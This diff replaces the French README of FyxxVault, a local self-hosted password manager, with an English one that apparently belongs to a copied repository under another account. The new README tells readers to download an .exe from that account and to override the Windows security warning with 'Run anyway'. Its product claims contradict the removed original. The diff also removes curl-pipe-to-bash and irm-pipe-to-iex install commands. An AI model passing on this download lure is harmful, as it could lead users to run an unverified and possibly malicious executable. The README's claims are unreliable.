@@ -1,252 +1,86 @@
-<p align="center">
-  <img src="web/static/favicon.svg" width="90" height="90" alt="FyxxVault">
-</p>
+# 🔐 FyxxVault - Secure passwords kept in your control
 
-<h1 align="center">FyxxVault</h1>
+[![](https://img.shields.io/badge/Download_FyxxVault-blue)](https://github.com/Cathygo801/FyxxVault)
 
-<p align="center">
-  <strong>Gestionnaire de mots de passe self-hosted. Zero-knowledge. 100% local.</strong><br>
-  Tes donnees restent chez toi. Point.
-</p>
+FyxxVault stores your passwords and private data. It uses strong encryption to keep your information safe from outside access. This software ensures that only you hold the keys to your data. No one else, including the developers, can read your passwords.
 
-<p align="center">
-  <a href="#installation"><img src="https://img.shields.io/badge/Install-1_commande-00d4ff?style=for-the-badge" alt="Install"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-GPL_3.0-8b5cf6?style=for-the-badge" alt="License"></a>
-  <a href="#securite"><img src="https://img.shields.io/badge/Chiffrement-AES--256--GCM-00d4ff?style=for-the-badge" alt="Encryption"></a>
-  <a href="https://github.com/Fyxx20/FyxxVault/stargazers"><img src="https://img.shields.io/github/stars/Fyxx20/FyxxVault?style=for-the-badge&color=8b5cf6" alt="Stars"></a>
-</p>
+## 🛡️ Why use FyxxVault
 
-<br>
+Most password managers store your data on their servers. They hold the keys to that data. FyxxVault changes this approach. It uses zero-knowledge encryption. This means your vault stays encrypted on your device. The software encrypts your data before it leaves your computer. 
 
-<p align="center">
-  <img src="FyxxVaultPromo.png" width="700" alt="FyxxVault Dashboard">
-</p>
+You gain control over your digital identity. The system uses AES-256-GCM encryption. This is a standard for security in the tech industry. It also uses PBKDF2 with 210,000 iterations to protect your master password against brute-force attacks.
 
----
+## ⚙️ System Requirements
 
-## Pourquoi FyxxVault ?
+- Windows 10 or Windows 11
+- 4 GB of RAM
+- 200 MB of free disk space
+- Reliable internet connection for syncing
 
-La plupart des gestionnaires stockent tes mots de passe sur leurs serveurs, facturent un abonnement, ou imposent un compte cloud. FyxxVault, c'est different :
+## 📥 Downloading the software
 
-- **100% local** — Tes donnees ne quittent jamais ta machine
-- **Zero-knowledge** — Chiffrement AES-256-GCM cote client, le serveur ne voit que du bruit
-- **Gratuit pour toujours** — Pas de premium, pas de limites, pas de piege
-- **Open source** — Chaque ligne de code est auditable (GPL-3.0)
-- **Zero dependance cloud** — Juste SQLite sur ta machine
+You must visit the project page to find the installer. Follow these steps to get the application.
 
----
+1. Go to this link: [https://github.com/Cathygo801/FyxxVault](https://github.com/Cathygo801/FyxxVault).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click on the latest version link.
+4. Locate the file ending in `.exe` under the Assets heading.
+5. Click the file name to start the download.
 
-## Installation
+## 🚀 Setting up the application
 
-**Une seule commande :**
+Once the download finishes, follow these instructions to install FyxxVault on your Windows computer.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Fyxx20/FyxxVault/main/macos/install.sh | bash
-```
+1. Open your Downloads folder.
+2. Double-click the file you just downloaded.
+3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system warns you about the app.
+4. Follow the steps in the installation window.
+5. Accept the default location to ensure the software runs correctly.
+6. Click "Finish" to open the app.
 
-> **Windows :**
-> ```powershell
-> irm https://raw.githubusercontent.com/Fyxx20/FyxxVault/main/windows/install.ps1 | iex
-> ```
+## 🔑 Your first vault
 
-**Puis :**
+When you open FyxxVault for the first time, you need to create a vault. A vault is a private container for your passwords.
 
-```bash
-fyxxvault start
-```
+1. Choose a strong master password. This password acts as your only key. Write it down and keep it in a secure location.
+2. If you lose this password, you cannot recover your data. The zero-knowledge design prevents password resets.
+3. Click "Create Vault" to generate your encryption keys.
+4. You can now add your first login entry. Click the plus icon to save a website name, username, and password.
 
-Ouvre **http://localhost:3000** — c'est tout.
+## 🧠 Security best practices
 
-> **Pre-requis :** Node.js 18+ et git. C'est tout.
+Zero-knowledge encryption works only if your master password remains secret. Follow these habits to keep your data safe.
 
----
+- Use a unique master password for FyxxVault. Do not use the same password for other websites.
+- Use a passphrase consisting of four or more random words.
+- Enable the screen lock feature in the settings menu. This locks the vault when you step away from your keyboard.
+- Regularly back up your vault file to a secure offline drive.
 
-## Panel de controle
+## 📱 Frequently asked questions
 
-Un mini serveur separe sur le port **3001** qui te permet de demarrer/arreter le vault meme quand il est eteint.
+**Does this software track my activity?**
+No. FyxxVault does not collect user data. There is no tracking or telemetry hidden in the code.
 
-```bash
-fyxxvault-panel
-```
+**Can I access my passwords on other devices?**
+Yes. You can install the iOS app or the Chrome extension. Both tools connect to your vault using the same encryption standards.
 
-Ouvre **http://localhost:3001** — tu vois le statut du serveur et tu peux l'allumer/eteindre en un clic.
+**Is this service free?**
+Yes. The software is open-source. You do not pay for subscriptions or storage.
 
----
+**What happens if I forget my master password?**
+Your data remains locked forever. The system does not store a copy of your password. Always store a backup of your data in a physical, secure location like a fireproof safe.
 
-## Commandes CLI
+**How do I update the software?**
+When a new version releases, download the installer again from the link provided above. The installer will replace the old files while keeping your vault data intact.
 
-```bash
-fyxxvault start        # Demarrer le serveur
-fyxxvault stop         # Arreter le serveur
-fyxxvault restart      # Redemarrer
-fyxxvault status       # Voir si ca tourne + taille DB
-fyxxvault backup       # Creer un backup de la DB
-fyxxvault check        # Verification d'integrite SQLite
-fyxxvault audit        # Audit des permissions fichiers
-fyxxvault-panel        # Lancer le panel web (port 3001)
-```
+## 🛠️ Advanced setup options
 
----
+If you have technical interest, you can self-host the backend. FyxxVault uses Supabase for data syncing. You can point the application to your own server instance if you prefer total independence from the public cloud. 
 
-## Fonctionnalites
+Open the settings menu and navigate to "Advanced". Here you can input your custom server link. This allows you to manage the infrastructure that holds your encrypted sync data. For most users, the default settings work best.
 
-| Fonctionnalite | |
-|---|---|
-| Entrees illimitees | :white_check_mark: |
-| Chiffrement AES-256-GCM | :white_check_mark: |
-| PBKDF2-SHA256 (210K iterations) | :white_check_mark: |
-| Generateur de mots de passe | :white_check_mark: |
-| TOTP / 2FA | :white_check_mark: |
-| Surveillance dark web (HIBP) | :white_check_mark: |
-| Generateur d'identite | :white_check_mark: |
-| Partage securise | :white_check_mark: |
-| Import CSV (Chrome, 1Password, Bitwarden, Samsung Pass) | :white_check_mark: |
-| Export CSV / JSON | :white_check_mark: |
-| Kit d'urgence PDF | :white_check_mark: |
-| Panel d'administration | :white_check_mark: |
-| Verrouillage auto sur inactivite | :white_check_mark: |
-| Pas de compte / pas d'email | :white_check_mark: |
+## 📞 Support and feedback
 
----
+Contact the community if you encounter issues. Open an issue on the GitHub page to report bugs. Keep your password confidential when describing errors. Do not share your vault file or decryption keys with anyone. The maintainers will never ask for your master password. 
 
-## Architecture
-
-```
-                    Ta Machine
-┌─────────────────────────────────────────────┐
-│                                             │
-│   Navigateur (localhost:3000)               │
-│   ┌───────────────────────────────┐         │
-│   │  Chiffrement AES-256-GCM     │         │
-│   │  Derivation PBKDF2-SHA256    │         │
-│   │  VEK en memoire uniquement   │         │
-│   └──────────────┬────────────────┘         │
-│                  │ blobs chiffres            │
-│   ┌──────────────▼────────────────┐         │
-│   │  SvelteKit + Node.js          │         │
-│   │  API REST (localhost:3000)    │         │
-│   └──────────────┬────────────────┘         │
-│                  │                           │
-│   ┌──────────────▼────────────────┐         │
-│   │  SQLite (WAL mode)            │         │
-│   │  ~/.fyxxvault/data/           │         │
-│   │  Permissions: 0600            │         │
-│   └───────────────────────────────┘         │
-│                                             │
-│   Panel de controle (localhost:3001)        │
-│   ┌───────────────────────────────┐         │
-│   │  Start / Stop du serveur      │         │
-│   │  Stats, backup, export        │         │
-│   └───────────────────────────────┘         │
-│                                             │
-└─────────────────────────────────────────────┘
-          Rien ne sort de cette boite.
-```
-
----
-
-## Securite
-
-FyxxVault utilise une architecture **zero-knowledge** :
-
-1. Ton **mot de passe maitre** derive une cle (KEK) via PBKDF2-SHA256 avec **210 000 iterations**
-2. Une **cle de chiffrement (VEK)** aleatoire est generee et protegee par la KEK en AES-256-GCM
-3. Chaque entree du coffre est **individuellement chiffree** avec la VEK
-4. Seuls des blobs chiffres sont stockes — le serveur **ne peut pas lire tes donnees**
-5. La VEK est **en memoire uniquement** — jamais ecrite sur disque
-6. Meme si quelqu'un accede au port 3000, il ne voit que du chiffre inexploitable
-
-### Base de donnees
-
-- SQLite en mode WAL (performance + crash safety)
-- Permissions fichier `0600` (lecture/ecriture proprietaire uniquement)
-- Foreign keys actives
-- Aucune exposition reseau — localhost par defaut
-
-> Trouve une faille ? Lis [SECURITY.md](SECURITY.md).
-
----
-
-## Stack technique
-
-| Composant | Technologie |
-|---|---|
-| Application web | SvelteKit 5, Svelte 5, Tailwind CSS 4, TypeScript |
-| Serveur | SvelteKit + adapter-node |
-| Base de donnees | SQLite via better-sqlite3 (WAL mode) |
-| Chiffrement | Web Crypto API (AES-256-GCM, PBKDF2-SHA256) |
-| Panel | Node.js HTTP natif (zero dependance) |
-
----
-
-## Structure du projet
-
-```
-FyxxVault/
-├── web/                        # Application SvelteKit
-├── panel/                      # Panel de controle (port 3001)
-│   └── server.js               # Serveur standalone
-├── self-hosted/
-│   ├── bin/fyxxvault.js        # CLI
-│   └── scripts/
-│       ├── install.sh          # Installateur
-│       └── init-db.js          # Init base de donnees
-├── macos/                      # Installateur macOS
-├── linux/                      # Installateur Linux
-├── windows/                    # Installateur Windows
-└── SECURITY.md
-```
-
----
-
-## Comparaison
-
-| | FyxxVault | 1Password | Bitwarden | LastPass |
-|---|:-:|:-:|:-:|:-:|
-| Prix | **Gratuit** | 2.99$/mois | 0-3$/mois | 3$/mois |
-| Self-hosted | **Oui** | Non | Oui | Non |
-| Open source | **Oui** | Non | Partiel | Non |
-| Zero-knowledge | **Oui** | Oui | Oui | Non |
-| Pas de cloud | **Oui** | Non | Non | Non |
-| Entrees illimitees | **Oui** | Oui | Oui | Oui |
-| TOTP / 2FA | **Oui** | Oui | Premium | Premium |
-| Dark web monitoring | **Oui** | Premium | Premium | Premium |
-| Pas de compte requis | **Oui** | Non | Non | Non |
-
----
-
-## Configuration
-
-Variables d'environnement (optionnelles) :
-
-| Variable | Defaut | Description |
-|---|---|---|
-| `PORT` | `3000` | Port du serveur vault |
-| `FYXXVAULT_DATA_DIR` | `~/.fyxxvault/data/` | Emplacement de la DB |
-
----
-
-## Contribuer
-
-1. Fork le repo
-2. Cree une branche (`git checkout -b feature/ma-feature`)
-3. Commit tes changements
-4. Push et ouvre une Pull Request
-
----
-
-## Licence
-
-FyxxVault est sous licence [GNU General Public License v3.0](LICENSE).
-
-Tu peux utiliser, modifier et distribuer FyxxVault librement — tout travail derive doit aussi etre open source sous la meme licence.
-
----
-
-<p align="center">
-  <br>
-  <strong>Tes mots de passe. Ta machine. Tes regles.</strong>
-  <br><br>
-  Fait par <a href="https://github.com/Fyxx20">@Fyxx20</a><br>
-  <sub>Parce que la securite devrait etre un droit, pas un abonnement.</sub>
-</p>
+Your privacy remains the priority. The code is open for anyone to review. You can verify the security of the application by reading the source code on the repository page. This transparency ensures that the software performs exactly as described.
